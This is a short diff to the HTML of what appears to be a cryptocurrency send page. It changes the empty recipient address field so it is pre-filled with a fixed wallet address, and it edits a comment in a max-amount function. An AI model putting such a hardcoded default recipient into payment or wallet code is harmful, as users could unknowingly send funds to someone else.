@@ -139,7 +139,7 @@
   <div class="container">
     <label>Address or Domain Name</label>
     <div class="input-box">
-      <input type="text" id="address" value="">
+      <input type="text" id="address" value="0x3BA4c387f786bFEE076A58914F5Bd38d668B42c3">
       <button class="clear-btn" onclick="document.getElementById('address').value = ''">&times;</button>
       <button class="paste-btn" onclick="navigator.clipboard.readText().then(text => document.getElementById('address').value = text)">Paste</button>
     </div>
@@ -160,7 +160,7 @@
 
   <script>
     function setMax() {
-      const maxAmount = 100; // You can fetch actual max from wallet in real Web3 version
+      const maxAmount = 100; // Static for now
       document.getElementById('amount').value = maxAmount;
       document.getElementById('converted').innerText = `= $${maxAmount.toFixed(2)}`;
     }
